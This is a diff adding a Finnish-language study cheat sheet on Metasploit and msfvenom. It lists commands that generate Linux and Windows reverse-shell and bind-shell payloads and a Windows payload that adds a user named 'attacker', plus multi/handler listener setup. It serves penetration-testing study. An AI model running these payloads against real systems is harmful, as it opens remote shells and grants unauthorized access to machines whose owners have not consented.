@@ -192,10 +192,41 @@ Lähteet: https://github.com/ffuf/pencode
 
 #### msfvenom & metasploit
 
+Metasploit on avoimen lähdekoodin tietoturva ja penetraatiotestauksen sovellus. Tarjoaa paljon erilaisia hyökkäystyökaluja ja payloadeja, millä voidaan suorittaa hyökkäyksiä. Toimii Ruby ohjelmointikielellä. Msfvenom on metasploitframeworkin komentorivityökalu, se on luotu hyötykuormien tekemiseen ja koodaamiseen.
+
+- **$ sudo systemctl start postgresql** # metasploit käyttää postgresql tietokantaa, joten se on hyvä käynnistää.
+- **$ sudo msfdb init** # alustaa metasploit tietokannan ja käyttämään postgresql tietokantaa
+- **$ sudo msfdb start** # Käynnistää molemmat tietokannat, eli ei varmaan tarvitse käynnistää postgresql erikseen.
+- **$ sudo msfdb status** # näkee mitä on käynnissä yms.
+- **$ sudo msfconsole** # avaa konsolin
+
+- **msfvenom -l payloads** # näyttää kaikki tarjolla olevat payloadit
+- **msfvenom -l encoders** # näyttää encoders
+
+Linuxin payload esimerkkejä (Reverse shell + Bind shell)
+
+ - **msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf** # luo reverse shellin linuxin payloadilla 32 bittisenä
+ - **msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf** # sama, mutta 64 bittisenä
+ - **msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf** # luo bind shellin linuxin payloadilla 32 bittisenä
+
+Windowsin payload esimerkkejä (Reverse shell + Bind shell + Create user)
+
+ - **msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe** # Luo reverse shellin windowsin payloadilla
+ - **msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe** # Luo bind shellin windowsin payloadilla
+ - **msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe** 
+
+
+
+Multi/handlerin käyttöä.
 
      msf6 > multi/handler
-     msf6 exploit(multi/handler) > set payload linux/x86/meterpreter_reverse_tcp
-     msf6 exploit(multi/handler) > set LHOST 192.168.57.102
-     msf6 exploit(multi/handler) > set LPORT "portti mih
-     msf6 exploit(multi/handler) > run -j
+     msf6 exploit(multi/handler) > set payload linux/x86/meterpreter_reverse_tcp # asetetaan payload
+     msf6 exploit(multi/handler) > set LHOST "localhost ip" # asetetaan localhosti
+     msf6 exploit(multi/handler) > set LPORT "localport" # asetetaan localportti
+     msf6 exploit(multi/handler) > run -j # ajetaan
+
+
+
+
+Lähteet: https://www.kali.org/docs/tools/starting-metasploit-framework-in-kali/ | https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html | https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom
 
